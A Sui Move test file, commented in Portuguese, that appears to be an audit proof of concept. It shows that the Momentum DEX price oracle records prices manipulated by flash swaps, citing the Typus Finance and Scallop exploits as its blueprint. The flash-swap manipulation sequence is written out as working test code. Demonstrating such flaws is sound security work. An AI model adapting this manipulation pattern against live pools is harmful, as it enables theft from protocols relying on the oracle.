#[test_only]
module slippage_check::oracle_manipulation_test;

use mmt_v3::i32;
use mmt_v3::i64;
use mmt_v3::pool;
use mmt_v3::trade;
use sui::balance;
use sui::clock;
use sui::sui::SUI;
use sui::test_scenario;
use mmt_v3::test_helper::{Self as th, USDC};

const SUI_DECIMALS: u64 = 1_000_000_000;
const USDC_DECIMALS: u64 = 1_000_000;

// ============================================================
// TESTE: Oracle Manipulation via Flash Swap
// ============================================================
// Blueprint: Ataque ao Typus Finance (US$3.44M, Out/2025)
//            Ataque ao Scallop (US$142K, Abr/2026)
//
// Demonstra que o oracle do Momentum DEX registra observacoes
// com precos manipulados sem qualquer protecao de tempo minimo
// ou variacao maxima.
// ============================================================

#[test]
fun test_oracle_manipulation_via_flash_swap() {
    let tester = @0xAF;
    let mut scenario = test_scenario::begin(tester);

    // Setup: criar pool e adicionar liquidez
    let version = th::take_version(test_scenario::ctx(&mut scenario));
    th::create_pool_<SUI, USDC>(100, 597742825358017408, true, &version, &mut scenario);

    test_scenario::next_tx(&mut scenario, tester);
    let mut pool = th::take_pool<SUI, USDC>(&mut scenario);
    let mut clock = clock::create_for_testing(test_scenario::ctx(&mut scenario));

    // Adicionar liquidez
    let lower_tick = mmt_v3::tick_math::get_tick_at_sqrt_price(583337266871351552);
    let upper_tick = mmt_v3::tick_math::get_tick_at_sqrt_price(611809286962066560);
    let (_, _, position) = th::add_liquidity_<SUI, USDC>(
        &mut pool, 1000, 1000, lower_tick, upper_tick, tester, &clock, &version, &mut scenario,
    );
    transfer::public_transfer(position, tester);

    test_scenario::next_tx(&mut scenario, tester);

    // === PASSO 1: Registrar estado inicial do oracle ===
    let initial_tick = pool::tick_index_current(&pool);

    // observe(pool, seconds_ago: vector<u64>, clock: &Clock)
    let mut seconds_ago = vector::empty<u64>();
    vector::push_back(&mut seconds_ago, 0);
    let (initial_tick_cumulative, _) = pool::observe(&pool, seconds_ago, &clock);

    // === PASSO 2: Avancar o clock em 60 segundos ===
    clock::increment_for_testing(&mut clock, 60000);

    // === PASSO 3: Executar flash swap para manipular o preco ===
    test_scenario::next_tx(&mut scenario, tester);

    let (balance_x, balance_y, receipt) = trade::flash_swap<SUI, USDC>(
        &mut pool,
        true,   // is_x_to_y
        true,   // exact_input
        500 * SUI_DECIMALS,
        4295048076, // sqrt_price_limit
        &clock,
        &version,
        test_scenario::ctx(&mut scenario),
    );

    let (pay_x, pay_y) = trade::swap_receipt_debts(&receipt);
    trade::repay_flash_swap<SUI, USDC>(
        &mut pool,
        receipt,
        balance::create_for_testing<SUI>(pay_x),
        balance::create_for_testing<USDC>(pay_y),
        &version,
        test_scenario::ctx(&mut scenario),
    );

    // === PASSO 4: Verificar que o preco foi manipulado ===
    let manipulated_tick = pool::tick_index_current(&pool);
    assert!(!i32::eq(manipulated_tick, initial_tick), 0);

    // === PASSO 5: Verificar que o oracle registrou o preco manipulado ===
    let mut seconds_ago2 = vector::empty<u64>();
    vector::push_back(&mut seconds_ago2, 0);
    let (new_tick_cumulative, _) = pool::observe(&pool, seconds_ago2, &clock);

    let initial_tick_cum = vector::borrow(&initial_tick_cumulative, 0);
    let new_tick_cum = vector::borrow(&new_tick_cumulative, 0);
    assert!(!i64::eq(*initial_tick_cum, *new_tick_cum), 1);

    // === CLEANUP ===
    balance::destroy_for_testing<SUI>(balance_x);
    balance::destroy_for_testing<USDC>(balance_y);
    th::return_pool<SUI, USDC>(pool);
    clock::destroy_for_testing(clock);
    mmt_v3::version::destroy_version_for_testing(version);
    test_scenario::end(scenario);
}

// ============================================================
// TESTE AUXILIAR: Multiplos flash swaps rapidos
// ============================================================

#[test]
fun test_oracle_accepts_rapid_observations() {
    let tester = @0xAF;
    let mut scenario = test_scenario::begin(tester);

    let version = th::take_version(test_scenario::ctx(&mut scenario));
    th::create_pool_<SUI, USDC>(100, 597742825358017408, true, &version, &mut scenario);

    test_scenario::next_tx(&mut scenario, tester);
    let mut pool = th::take_pool<SUI, USDC>(&mut scenario);
    let clock = clock::create_for_testing(test_scenario::ctx(&mut scenario));

    let lower_tick = mmt_v3::tick_math::get_tick_at_sqrt_price(583337266871351552);
    let upper_tick = mmt_v3::tick_math::get_tick_at_sqrt_price(611809286962066560);
    let (_, _, position) = th::add_liquidity_<SUI, USDC>(
        &mut pool, 1000, 1000, lower_tick, upper_tick, tester, &clock, &version, &mut scenario,
    );
    transfer::public_transfer(position, tester);

    test_scenario::next_tx(&mut scenario, tester);

    let initial_tick = pool::tick_index_current(&pool);

    // Executar 3 flash swaps rapidos
    let mut i = 0;
    while (i < 3) {
        test_scenario::next_tx(&mut scenario, tester);

        let (balance_x, balance_y, receipt) = trade::flash_swap<SUI, USDC>(
            &mut pool, true, true, 100 * SUI_DECIMALS, 4295048076,
            &clock, &version, test_scenario::ctx(&mut scenario),
        );

        let (pay_x, pay_y) = trade::swap_receipt_debts(&receipt);
        trade::repay_flash_swap<SUI, USDC>(
            &mut pool, receipt,
            balance::create_for_testing<SUI>(pay_x),
            balance::create_for_testing<USDC>(pay_y),
            &version, test_scenario::ctx(&mut scenario),
        );

        balance::destroy_for_testing<SUI>(balance_x);
        balance::destroy_for_testing<USDC>(balance_y);
        i = i + 1;
    };

    let final_tick = pool::tick_index_current(&pool);
    assert!(!i32::eq(final_tick, initial_tick), 0);

    th::return_pool<SUI, USDC>(pool);
    clock::destroy_for_testing(clock);
    mmt_v3::version::destroy_version_for_testing(version);
    test_scenario::end(scenario);
}
